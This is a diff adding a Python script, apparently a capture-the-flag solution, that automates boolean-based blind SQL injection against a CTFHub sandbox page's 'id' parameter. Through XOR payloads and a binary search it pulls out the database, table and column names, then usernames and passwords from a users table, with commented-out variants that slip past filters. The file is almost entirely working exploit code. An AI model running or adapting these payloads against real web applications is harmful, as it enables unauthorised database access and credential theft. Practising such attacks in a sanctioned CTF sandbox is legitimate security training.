@@ -1,0 +1,33 @@
+import requests
+import time
+
+url="http://challenge-7fe159b295bb20a1.sandbox.ctfhub.com:10800/image.php?id="
+name=''
+
+
+for i in range(1,80):
+    print(i)
+    low=31
+    high=127
+    mid=(low+high)//2
+    while low<high:
+        #payload = "0^(ascii(substr((select(database())),%d,1))>%d)" % (i, mid)
+        #payload = "0^(ascii(substr((select(flag)from(flag)),%d,1))>%d)" % (i, mid)
+        #payload = "0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)"%(i,mid)
+        #payload = "0^(ascii(substr((select(group_concat(table_name))from(sys.x$schema_table_statistics_with_buffer)where(table_schema=database())),%d,1))>%d)"%(i,mid)
+        #payload = "0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),%d,1))>%d)"%(i,mid)
+        payload = "0^(ascii(substr((select(group_concat(username,password))from(users)),%d,1))>%d)"%(i,mid)
+        #payload = "0/**/or/**/if(ascii(substr((select/**/group_concat(Password)from/**/user),%d,1))<%d,1,0)"%(i,mid)
+        
+
+        r = requests.get(url+payload)
+        print(payload)
+        if r.content :   #cyber为文章内容，一旦正常返回，则字符爆破正确
+            low = mid+1
+        else:
+            high=mid
+        mid=(low+high)//2
+        if(mid==32):
+            break
+    name=name+chr(mid)
+    print (name)
